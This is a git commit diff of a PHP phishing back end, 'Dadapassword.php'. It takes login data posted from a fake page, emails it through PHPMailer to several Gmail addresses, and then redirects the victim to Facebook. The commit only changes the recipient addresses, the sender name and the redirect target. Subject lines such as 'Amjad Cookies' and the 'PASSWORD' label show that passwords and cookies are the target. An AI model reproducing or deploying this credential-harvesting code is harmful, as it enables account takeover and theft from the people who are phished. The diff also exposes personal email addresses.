97c835ee0fa5766d5ff292e3eca63303f84ffb8d
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-08 21:18:49 +0500

    Update and rename amjad.php to Dadapassword.php

--- Dadapassword.php
+++ Dadapassword.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-cczqz4cd1pfr0708-support.vercel.app/");
+header("Location: web.facebook.com/me");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -34,17 +34,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
         // Email properties
-        $mail->setFrom('patjckbang@gmail.com', 'PASSWORD');
-        $mail->addAddress('ahmjtalijaan@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
-      $mail->addAddress('roniriyaa@gmail.com');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
+        $mail->addAddress('officialw224@gmail.com');
+       $mail->addAddress('Lernayouamzaxal@gmail.com');
+      
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Amjad Cookies';
+        $mail->Subject = 'Dada';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
